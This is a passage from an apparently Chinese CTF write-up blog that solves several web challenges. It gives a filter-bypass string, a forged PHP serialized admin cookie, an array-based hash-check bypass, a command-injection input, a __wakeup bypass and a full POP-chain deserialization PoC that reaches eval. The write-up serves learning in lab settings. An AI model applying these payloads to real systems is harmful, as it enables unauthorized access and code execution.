lfxyxlybjgfjspxyc xp.&#x27;</span><br><span class="line">flag=&#x27;&#123;5HK5717H710Y_3N0UH710Y_59533E2J&#125;&#x27;</span><br><span class="line"></span><br><span class="line">for i in aim:</span><br><span class="line">    cnt=96</span><br><span class="line">    if(ord(i)&lt;64 or ord(i)&gt;133):</span><br><span class="line">        print(i,end=&quot;&quot;)</span><br><span class="line">    if(i==&quot;_&quot;):</span><br><span class="line">        print(i,end=&quot;&quot;)</span><br><span class="line">    for k in key:</span><br><span class="line">        cnt+=1</span><br><span class="line">        if(i==k or i==chr(ord(k)+97-65)):</span><br><span class="line">            print(chr(cnt),end=&quot;&quot;)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="RITSECctf"><a href="#RITSECctf" class="headerlink" title="RITSECctf"></a>RITSECctf</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="Pretty-Horrible-Program1"><a href="#Pretty-Horrible-Program1" class="headerlink" title="Pretty Horrible Program1"></a>Pretty Horrible Program1</h4><p>查看题目提供的源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;bingus&#x27;])) &#123;</span><br><span class="line">  $input = $_GET[&#x27;bingus&#x27;];</span><br><span class="line">  $to_replace = &#x27;bingus&#x27;;</span><br><span class="line">  $clean_string = preg_replace(&quot;/$to_replace/&quot;, &#x27;&#x27;, $input);</span><br><span class="line">  echo &quot;&lt;p&gt;Your string is: $clean_string&lt;/p&gt;&quot;;</span><br><span class="line">  if ($clean_string == $to_replace) &#123;</span><br><span class="line">    echo &quot;&lt;h2 class=\&quot;answer\&quot;&gt;Bingus &lt;span style=\&quot;color: green;\&quot;&gt;IS&lt;/span&gt; your beloved&lt;/h2&gt;&quot;;</span><br><span class="line">    output_flag();</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &quot;&lt;h2 class=\&quot;answer\&quot;&gt;Bingus &lt;span style=\&quot;color: red;\&quot;&gt;IS NOT&lt;/span&gt; your beloved&lt;/h2&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>输入<code>bingus</code>，替换字符中的关键字为空，但只有单此替换，使用重复字节绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bingbingusus</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h4 id="Pretty-Horrible-Program2"><a href="#Pretty-Horrible-Program2" class="headerlink" title="Pretty Horrible Program2"></a>Pretty Horrible Program2</h4><p>查看提供源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">  public $role = &#x27;User&#x27;;</span><br><span class="line"></span><br><span class="line">  public function is_admin()</span><br><span class="line">  &#123;</span><br><span class="line">    if ($this-&gt;role == &#x27;Admin&#x27;) &#123;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function __sleep()</span><br><span class="line">  &#123;</span><br><span class="line">    return array($this-&gt;role);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_COOKIE[&#x27;user&#x27;])) &#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Output:&lt;br/&gt;&quot; . $_COOKIE[&#x27;user&#x27;] . &#x27;&lt;/p&gt;&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  echo &#x27;Please provide some input.&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_COOKIE[&#x27;user&#x27;])) &#123;</span><br><span class="line">  try &#123;</span><br><span class="line">    $user = unserialize($_COOKIE[&#x27;user&#x27;]);</span><br><span class="line">    if ($user-&gt;is_admin()) &#123;</span><br><span class="line">      echo &#x27;&lt;h3 class=&quot;success&quot;&gt;Welcome Admin&lt;/h3&gt;&#x27;;</span><br><span class="line">      output_flag();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &#x27;&lt;h3 class=&quot;error&quot;&gt;Not Admin&lt;/h3&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; catch (Error $e) &#123;</span><br><span class="line">    echo &#x27;&lt;h2 class=&quot;error&quot;&gt;Uh oh, ur input was &lt;code&gt;cringe&lt;/code&gt;&lt;/h2&gt;&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>PHP反序列化漏洞<em>不知道为什么直接生成的脚本没有变量名</em><br>构造payload<br><code> O:4:&quot;User&quot;:1:&#123;s:4:&quot;role&quot;;s:5:&quot;Admin&quot;;&#125;</code><br>得到flag。RS{C3re4l_B1ngu5}</p>
<h4 id="Pretty-Horrible-Program3"><a href="#Pretty-Horrible-Program3" class="headerlink" title="Pretty Horrible Program3"></a>Pretty Horrible Program3</h4><p>查看提供的源码<br>sha256绕过，<br>使用数组绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php3?input1[]=1&amp;input2[]=2</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h4 id="Really-Cool-Encryption"><a href="#Really-Cool-Encryption" class="headerlink" title="Really Cool Encryption"></a>Really Cool Encryption</h4><p>input存在任意命令执行漏洞<br><code>input=asd;ls</code>查看目录，得到base64加密的回显<br>尝试catflag，失败<br>发现存在<code>dockerfile</code><br>cat dockerfile，恢复image</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p80:80 youngbaofeng/google-image-search-pertext</span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure>
<h2 id="Space-Heroes-CTF-2022"><a href="#Space-Heroes-CTF-2022" class="headerlink" title="Space Heroes CTF 2022"></a>Space Heroes CTF 2022</h2><h3 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h3><h4 id="R2D2"><a href="#R2D2" class="headerlink" title="R2D2"></a>R2D2</h4><p>打开网址<br>一张星球大战两个机器人的照片，<br>盲猜和<code>robots.txt</code>有关<br>打开后直接获得flag。</p>
<h4 id="Space-traveler"><a href="#Space-traveler" class="headerlink" title="Space traveler"></a>Space traveler</h4><p>打开网页，提示查看js脚本<br>获得源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var _0xb645 = [&quot;\x47\x75\x65\x73\x73\x20\x54\x68\x65\x20\x46\x6C\x61\x67&quot;, &quot;\x73\x68\x63\x74\x66\x7B\x66\x6C\x61\x67\x7D&quot;, &quot;\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x72\x69\x67\x68\x74\x2E&quot;, &quot;\x73\x68\x63\x74\x66\x7B\x65\x69\x67\x68\x74\x79\x5F\x73\x65\x76\x65\x6E\x5F\x74\x68\x6F\x75\x73\x61\x6E\x64\x5F\x6D\x69\x6C\x6C\x69\x6F\x6E\x5F\x73\x75\x6E\x73\x7D&quot;, &quot;\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x77\x72\x6F\x6E\x67\x2E&quot;, &quot;\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C&quot;, &quot;\x64\x65\x6D\x6F&quot;, &quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;];</span><br><span class="line"></span><br><span class="line">function myFunction() &#123;</span><br><span class="line">    let _0xb729x2;</span><br><span class="line">    let _0xb729x3 = prompt(_0xb645[0], _0xb645[1]);</span><br><span class="line">    switch (_0xb729x3) &#123;</span><br><span class="line">        case _0xb645[3]:</span><br><span class="line">            _0xb729x2 = _0xb645[2];</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            _0xb729x2 = _0xb645[4]</span><br><span class="line">    &#125;;</span><br><span class="line">    document[_0xb645[7]](_0xb645[6])[_0xb645[5]] = _0xb729x2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>js前端代码混淆，应该是ob混淆<br>尝试复原<br>在线解码网页<br><code>https://deobfuscate.io/</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function myFunction() &#123;</span><br><span class="line">  let azante;</span><br><span class="line">  let karynna = prompt(&quot;Guess The Flag&quot;, &quot;shctf&#123;flag&#125;&quot;);</span><br><span class="line">  switch (karynna) &#123;</span><br><span class="line">    case &quot;shctf&#123;eighty_seven_thousand_million_suns&#125;&quot;:</span><br><span class="line">      azante = &quot;You guessed right.&quot;;</span><br><span class="line">      break;</span><br><span class="line">    default:</span><br><span class="line">      azante = &quot;You guessed wrong.&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  ;</span><br><span class="line">  document.getElementById(&quot;demo&quot;).innerHTML = azante;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="反序列化demo"><a href="#反序列化demo" class="headerlink" title="反序列化demo"></a>反序列化demo</h2><h3 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h3><p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  error_reporting(<span class="number">0</span>); <span class="comment">//关闭错误报告</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">happy</span></span>&#123; </span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$file</span>=<span class="string">&#x27;demo1.php&#x27;</span>; </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;file=<span class="variable">$file</span>; </span><br><span class="line">        &#125; </span><br><span class="line">         </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123; <span class="comment">//该函数会在类的一个对象被删除时自动调用</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt;file,<span class="string">&quot;\\&quot;</span>)===<span class="literal">false</span> &amp;&amp; strchr(<span class="keyword">$this</span>-&gt;file,<span class="string">&#x27;/&#x27;</span>)===<span class="literal">false</span>) <span class="comment">//过滤了文件名中的\\与/</span></span><br><span class="line">                    show_source(dirname(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/&#x27;</span>.<span class="keyword">$this</span>-&gt;file); <span class="comment">//打开文件操作</span></span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Wrong filename.&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">         </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;file=<span class="string">&#x27;demo1.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> &#125;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">        show_source(<span class="string">&#x27;demo1.php&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="variable">$file</span>=base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br><span class="line">        <span class="keyword">echo</span> unserialize(<span class="variable">$file</span>); </span><br><span class="line">        &#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!--password in flag.php--&gt; </span><br></pre></td></tr></table></figure>
<p>wakeup魔术方法绕过<br>通过更改序列化后的数字标识绕过<br>获得flag</p>
<h3 id="DEMO2"><a href="#DEMO2" class="headerlink" title="DEMO2"></a>DEMO2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">&#x27;demo2.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;varr = <span class="string">&quot;demo2.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;varr))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;文件&quot;</span>.<span class="keyword">$this</span>-&gt;varr.<span class="string">&quot;存在&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;varr=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj=<span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;varr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;这是f2的析构函数&lt;br /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;varr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;这是f3的析构函数&lt;br /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>])) &#123;</span><br><span class="line">		unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>poc<br>test3：eval任意命令执行-&gt;test2:__tostring调用execute方法-&gt;test1:对象转化为字符串调用test2：__tostring</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;varr = <span class="keyword">new</span> test2();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test2</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;varr=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;obj=<span class="keyword">new</span> test3();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">test3</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$varr</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$o</span> = <span class="keyword">new</span> test1();</span><br><span class="line">	<span class="variable">$s</span> = serialize(<span class="variable">$o</span>);</span><br><span class="line">	<span class="keyword">echo</span> urlencode(<span class="variable">$s</span>);</span><br><span class="line"><span class="comment">//O%3A5%3A%22test1%22%3A1%3A%7Bs%3A4%3A%22varr%22%3BO%3A5%3A%22test2%22%3A2%3A%7Bs%3A4%3A%22varr%22%3Bs%3A6%3A%22123456%22%3Bs%3A3%3A%22obj%22%3BO%3A5%3A%22test3%22%3A1%3A%7Bs%3A4%3A%22varr%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D%7D</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/28/3-30/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hanbaiGG">
      <meta itemprop="description" content="为什么不拉弟弟一把呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="灵能对抗实验室">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/28/3-30/" class="post-title-link" itemprop="url">3-30</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-03-28 18:53:13" itemprop="dateCreated datePublished" datetime="2022-03-28T18:53:13+08:00">2022-03-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-03-30 18:58:41" itemprop="dateModified" datetime="2022-03-30T18:58:41+08:00">2022-03-30</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="picoctf"><a href="#picoctf" class="headerlink" title="picoctf"></a>picoctf</h1><h2 id="MOST-COOKIE"><a href="#MOST-COOKIE" class="headerlink" title="MOST COOKIE"></a>MOST COOKIE</h2><p>flask模板，提供了sever.py<br>源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, url_for, redirect, make_response, flash, session</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag_value = <span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>).read().rstrip()</span><br><span class="line">title = <span class="string">&quot;Most Cookies&quot;</span></span><br><span class="line">cookie_names = [<span class="string">&quot;snickerdoodle&quot;</span>, <span class="string">&quot;chocolate chip&quot;</span>, <span class="string">&quot;oatmeal raisin&quot;</span>, <span class="string">&quot;gingersnap&quot;</span>, <span class="string">&quot;shortbread&quot;</span>, <span class="string">&quot;peanut butter&quot;</span>, <span class="string">&quot;whoopie pie&quot;</span>, <span class="string">&quot;sugar&quot;</span>, <span class="string">&quot;molasses&quot;</span>, <span class="string">&quot;kiss&quot;</span>, <span class="string">&quot;biscotti&quot;</span>, <span class="string">&quot;butter&quot;</span>, <span class="string">&quot;spritz&quot;</span>, <span class="string">&quot;snowball&quot;</span>, <span class="string">&quot;drop&quot;</span>, <span class="string">&quot;thumbprint&quot;</span>, <span class="string">&quot;pinwheel&quot;</span>, <span class="string">&quot;wafer&quot;</span>, <span class="string">&quot;macaroon&quot;</span>, <span class="string">&quot;fortune&quot;</span>, <span class="string">&quot;crinkle&quot;</span>, <span class="string">&quot;icebox&quot;</span>, <span class="string">&quot;gingerbread&quot;</span>, <span class="string">&quot;tassie&quot;</span>, <span class="string">&quot;lebkuchen&quot;</span>, <span class="string">&quot;macaron&quot;</span>, <span class="string">&quot;black and white&quot;</span>, <span class="string">&quot;white chocolate macadamia&quot;</span>]</span><br><span class="line">app.secret_key = random.choice(cookie_names)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	<span class="keyword">if</span> session.get(<span class="string">&quot;very_auth&quot;</span>):</span><br><span class="line">		check = session[<span class="string">&quot;very_auth&quot;</span>]</span><br><span class="line">		<span class="keyword">if</span> check == <span class="string">&quot;blank&quot;</span>:</span><br><span class="line">			<span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, title=title)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">return</span> make_response(redirect(<span class="string">&quot;/display&quot;</span>))</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		resp = make_response(redirect(<span class="string">&quot;/&quot;</span>))</span><br><span class="line">		session[<span class="string">&quot;very_auth&quot;</span>] = <span class="string">&quot;blank&quot;</span></span><br><span 